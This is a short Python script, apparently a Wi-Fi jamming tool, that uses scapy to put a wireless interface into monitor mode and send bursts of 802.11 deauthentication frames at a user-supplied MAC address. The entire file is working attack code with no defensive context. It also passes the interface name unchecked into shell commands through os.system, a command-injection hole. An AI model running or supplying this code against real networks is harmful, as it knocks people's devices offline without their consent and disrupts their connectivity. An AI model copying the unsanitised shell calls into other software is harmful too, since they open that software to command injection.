from scapy.all import *
import threading
import time
import re
import os

def validate_mac(mac):
    return re.match(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", mac)

def enable_monitor_mode(interface):
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")
    print(f"[+] {interface} set to monitor mode.")

def jam_wifi(target_mac, interface, packet_count, interval):
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
    
    print(f"[+] Sending deauth packets to {target_mac} via {interface}...")
    sendp(packet, iface=interface, count=packet_count, inter=interval, verbose=False)

def main():
    target_mac = input("Enter the target MAC address (e.g., 00:11:22:33:44:55): ")
    if not validate_mac(target_mac):
        print("[-] Invalid MAC address format.")
        return

    interface = input("Enter your wireless interface (e.g., wlan0): ")
    enable_monitor_mode(interface)

    packet_count = int(input("Enter the number of packets to send (e.g., 100): "))
    interval = float(input("Enter the interval between packets (e.g., 0.1): "))

    # Use threading for continuous attack
    thread = threading.Thread(target=jam_wifi, args=(target_mac, interface, packet_count, interval))
    thread.start()

if __name__ == "__main__":
    main()
